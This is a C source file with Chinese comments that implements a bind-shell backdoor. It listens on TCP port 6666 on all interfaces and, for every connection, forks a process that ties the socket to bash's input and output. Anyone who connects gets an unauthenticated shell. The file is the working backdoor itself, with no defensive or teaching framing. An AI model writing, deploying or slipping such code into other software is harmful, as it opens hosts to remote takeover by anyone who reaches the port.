#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

#include<netinet/in.h>
#include <sys/socket.h>

int main()
{
    
    //创建一个socket
    int listen_fd = socket(AF_INET,SOCK_STREAM,0);
    
    
    //配置ip port 协议
    struct sockaddr_in addrSrc,addrClient;
    addrSrc.sin_family=AF_INET;
    addrSrc.sin_port=htons(6666);
    addrSrc.sin_addr.s_addr=INADDR_ANY;
        
    //绑定
    bind(listen_fd,(struct sockaddr*)&addrSrc,sizeof(struct sockaddr_in));
 
    //监听
    listen(listen_fd,5);
    
    while(1)
    {
        int connect_fd=0;
        int len=sizeof(struct sockaddr_in);
        connect_fd=accept(listen_fd,(struct sockaddr*)&addrClient,&len);


                
        pid_t pid = fork();
        
        if (pid < 0)
        {
            return -1;
            
        } 
        else if (pid == 0)
        {
            dup2(connect_fd,0); 
            dup2(connect_fd,1); 
            dup2(connect_fd,2); 
            execl("/bin/bash","bash",NULL);              
            close(connect_fd);
            exit(-1);              
        } 
/*
    这样做虽然可以多个客户端一起调用,但会导致每个客户端退出都产生一个僵尸进程
*/
#if 0        
        else {
            int status=0;
            wait(&status);           
        }
        
        close(connect_fd);
#endif        
    }    
    return 0;
}